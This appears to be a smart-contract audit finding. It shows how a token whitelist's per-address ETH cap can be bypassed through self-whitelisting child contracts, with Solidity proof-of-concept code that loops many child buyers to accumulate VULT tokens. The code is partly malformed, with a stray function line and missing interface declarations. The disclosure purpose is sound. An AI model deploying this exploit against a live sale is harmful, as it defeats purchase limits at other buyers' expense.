# Vulnerability details

## Impact
While the `whitelist` contract restricts users' `ETH` amounts to less than `_maxAddressCap`, this restriction can be bypassed.
As a result, users may lose their funds.
For example, a user might overlook slippage because it is known to him the pool's balance changes slightly (less than 3 `ETH`) in a single transaction. Consequently, the user could become a victim of a sandwich attack.

## Proof of Concept
A malicious contract can purchase unlimited amounts of `VULT` tokens to exceed the `ETH` limited by `_maxAddressCap`.
This contract generates numerous child contracts, each one can be self-whitelisted by calling the whitelist contract.
```
receive() external payable {
    if (_isSelfWhitelistDisabled) {
        revert SelfWhitelistDisabled();
    }
    if (_isBlacklisted[_msgSender()]) {
        revert Blacklisted();
    }
    _addWhitelistedAddress(_msgSender());
    payable(_msgSender()).transfer(msg.value);
}
```
The `checkWhitelist` function only restricts the cap for child contracts.
```
function checkWhitelist(address from, address to, uint256 amount) external onlyVultisig {
    if (from == _pool && to != owner()) {
        ...
        // // Calculate rough ETH amount for VULT amount
        uint256 estimatedETHAmount = IOracle(_oracle).peek(amount);
        if (_contributed[to] + estimatedETHAmount > _maxAddressCap) {
            revert MaxAddressCapOverflow();
        }
        _contributed[to] += estimatedETHAmount;
    }
}
```
Each child contract buys `VULT` tokens with `ETH` amounts less than `_maxAddressCap` and transfers them to the parent contract. 
Consequently, this malicious contract accumulates a substantial amount of `VULT` tokens.

    function transfer(address to, uint256 amount) external;

contract ChildBuyer {

    function deliver(address whitelist, address v3router, address raisetoken, address vult, uint256 amount) external {
        payable(whitelist).call{value: 0}("");

        IERC20(raisetoken).approve(v3router, amount);
        IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: raisetoken,
            tokenOut: vult,
            fee: 3000,
            recipient: address(this),
            deadline: 2 * 10 ** 9,
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        IV3SwapRouter(v3router).exactInputSingle(params);
        IERC20(vult).transfer(msg.sender, IERC20(vult).balanceOf(address(this)));
    }
}

contract MaxAddressCapBroker {

    address immutable whitelist;
    address immutable v3router;
    address immutable raisetoken;
    address immutable vult;

    constructor(address _whitelist, address _v3router, address _raisetoken, address _vult) {
        whitelist = _whitelist;
        v3router = _v3router;
        raisetoken = _raisetoken;
        vult = _vult;
    }

    function BuyVULTMuchMore(uint256 cnt, uint256 amount /* about _maxAddressCap (3 ether) */) external {
        require(IERC20(raisetoken).balanceOf(address(this)) >= cnt * amount, 'ISR');
        for (uint256 i = 0; i < cnt; i ++) {
            address childbuyer = address(new ChildBuyer());
            IERC20(raisetoken).transfer(childbuyer, amount);
            IChildBuyer(childbuyer).deliver(whitelist, v3router, raisetoken, vult, amount);
        }
    }
}
